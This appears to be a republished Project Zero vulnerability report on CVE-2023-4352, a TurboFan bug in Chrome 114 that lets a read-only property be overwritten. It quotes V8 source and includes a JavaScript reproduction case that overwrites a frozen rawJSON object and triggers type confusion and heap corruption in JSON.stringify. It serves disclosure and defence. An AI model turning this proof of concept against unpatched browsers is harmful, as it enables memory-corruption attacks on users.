@@ -1,0 +1,160 @@
+id: 39068
+date: 09/18/2023
+title: Chrome Read-Only Property Overwrite Exploit
+author: Glazvunov
+cves: CVE-2023-4352
+
+Chrome: Read-only property overwrite in TurboFan
+
+VULNERABILITY DETAILS
+While collecting information for a property store, TurboFan bails out if the property isn't writable[2]. Unfortunately, the branch condition[1] does not include one of the store modes, namely `kDefine`. This allows an attacker to overwrite arbitrary non-configurable, read-only properties. It takes a few extra steps to convince TurboFan to compile a vulnerable function -- see the reproduction case section.
+
+This issue can be abused to trigger a type confusion in `JsonStringifier::Serialize_`. The function assumes that a `JSRawJson` object can only have a string as its `rawJSON` property value, because `JSRawJson::Create` freezes the object[3] before returning it to the user. Therefore, `Serialize_` doesn't perform a type check before casting the result of `GetProperty` to the string type[4]. `AppendString` might then attempt to concatenate the bogus string[5], corrupting the heap.
+
+
+REFERENCES
+https://source.chromium.org/chromium/chromium/src/+/refs/heads/main:v8/src/compiler/access-info.cc;drc=5992439d25f71ce29efa8db1c699b99e8773d41f;l=708
+```
+PropertyAccessInfo AccessInfoFactory::ComputePropertyAccessInfo(
+    MapRef map, NameRef name, AccessMode access_mode) const {
+[...]
+  while (true) {
+    PropertyDetails details = PropertyDetails::Empty();
+    InternalIndex index = InternalIndex::NotFound();
+    if (!TryLoadPropertyDetails(map, holder, name, &index, &details)) {
+      return Invalid();
+    }
+
+    if (index.is_found()) {
+      if (access_mode == AccessMode::kStore ||  // *** 1 ***
+          access_mode == AccessMode::kStoreInLiteral) {
+        DCHECK(!map.is_dictionary_map());
+
+        // Don't bother optimizing stores to read-only properties.
+        if (details.IsReadOnly()) return Invalid();  // *** 2 ***
+[...]
+}
+```
+
+https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-raw-json.cc;drc=93e93056e3849e78a8c77fe6fd0c2a0983a0b3f4;l=17
+```
+MaybeHandle<JSRawJson> JSRawJson::Create(Isolate* isolate,
+                                         Handle<Object> text) {
+  DCHECK(v8_flags.harmony_json_parse_with_source);
+  Handle<String> json_string;
+  ASSIGN_RETURN_ON_EXCEPTION(isolate, json_string,
+                             Object::ToString(isolate, text), JSRawJson);
+  Handle<String> flat = String::Flatten(isolate, json_string);
+  if (String::IsOneByteRepresentationUnderneath(*flat)) {
+    if (!JsonParser<uint8_t>::CheckRawJson(isolate, flat)) {
+      DCHECK(isolate->has_pending_exception());
+      return MaybeHandle<JSRawJson>();
+    }
+  } else {
+    if (!JsonParser<uint16_t>::CheckRawJson(isolate, flat)) {
+      DCHECK(isolate->has_pending_exception());
+      return MaybeHandle<JSRawJson>();
+    }
+  }
+  Handle<JSObject> result =
+      isolate->factory()->NewJSObjectFromMap(isolate->js_raw_json_map());
+  result->InObjectPropertyAtPut(JSRawJson::kRawJsonInitialIndex, *flat);
+  JSObject::SetIntegrityLevel(isolate, result, FROZEN, kThrowOnError).Check();  // *** 3 ***
+  return Handle<JSRawJson>::cast(result);
+}
+```
+
+https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-stringifier.cc;drc=221294ce14cb14f84afa156f3c590700bc615dc1;l=530
+```
+JsonStringifier::Result JsonStringifier::Serialize_(Handle<Object> object,
+                                                    bool comma,
+                                                    Handle<Object> key) {
+[...]
+  InstanceType instance_type =
+      HeapObject::cast(*object).map(cage_base).instance_type();
+  switch (instance_type) {
+[...]
+    case JS_RAW_JSON_TYPE:
+      DCHECK(v8_flags.harmony_json_parse_with_source);
+      if (deferred_string_key) SerializeDeferredKey(comma, key);
+      {
+        Handle<JSRawJson> raw_json_obj = Handle<JSRawJson>::cast(object);
+        Handle<String> raw_json;
+        if (raw_json_obj->HasInitialLayout(isolate_)) {
+          // Fast path: the object returned by JSON.rawJSON has its initial map
+          // intact.
+          raw_json = Handle<String>::cast(handle(
+              raw_json_obj->InObjectPropertyAt(JSRawJson::kRawJsonInitialIndex),
+              isolate_));
+        } else {
+          // Slow path: perform a property get for \"rawJSON\". Because raw JSON
+          // objects are created frozen, it is still guaranteed that there will
+          // be a property named \"rawJSON\" that is a String. Their initial maps
+          // only change due to VM-internal operations like being optimized for
+          // being used as a prototype.
+          raw_json = Handle<String>::cast(  // *** 4 ***
+              JSObject::GetProperty(isolate_, raw_json_obj,
+                                    isolate_->factory()->raw_json_string())
+                  .ToHandleChecked());
+        }
+        builder_.AppendString(raw_json); // *** 5 ***
+      }
+[...]
+}
+```
+
+
+VERSION
+Google Chrome 114.0.5735.90 (Official Build) 
+V8 version 11.6.0
+
+
+REPRODUCTION CASE
+```
+const PROP_NAME = \"rawJSON\",
+      PROP_VALUE = 0x21212121;  // Will be interpreted as a compressed pointer by `Serialize_`.
+
+let define_property_holder = {};
+define_property_holder.for_deprecation = 1;  // See below.
+
+function ReturnHolder() { return define_property_holder; };
+class Trigger extends ReturnHolder {  // Extend a function that returns a value so that it possible
+                                      // to store on an existing object.
+
+  [PROP_NAME] = (     // A keyed class property initializer is translated to a `kDefine` store.
+
+    this[PROP_NAME],  // The store operation performed on the target object will always throw in
+                      // the interpreter, so the object's map won't be added to the feedback slot.
+                      // Emit a load so that its feedback map can be reused by the store.
+    PROP_VALUE
+  )
+};
+
+for (let i = 0; i < 10; ++i)
+  new Trigger;  // The store operation has to have a non-empty feedback slot. Use a regular object
+                // with the writable target property for that.
+
+define_property_holder.for_deprecation = 1.1;  // Deprecate the map in the feedback vector so that
+                                               // it's discarded by TurboFan.
+
+define_property_holder = JSON.rawJSON(\"1\");    // The special target object.
+
+try { new Trigger } catch { }  // Add the target object map to the load operation's feedback slot.
+
+%OptimizeFunctionOnNextCall(Trigger);
+new Trigger;
+
+JSON.stringify(define_property_holder);
+```
+
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2023-09-05.
+
+
+Related CVE Numbers: CVE-2023-4352.
+
+#  0day.today [2023-09-18]  #
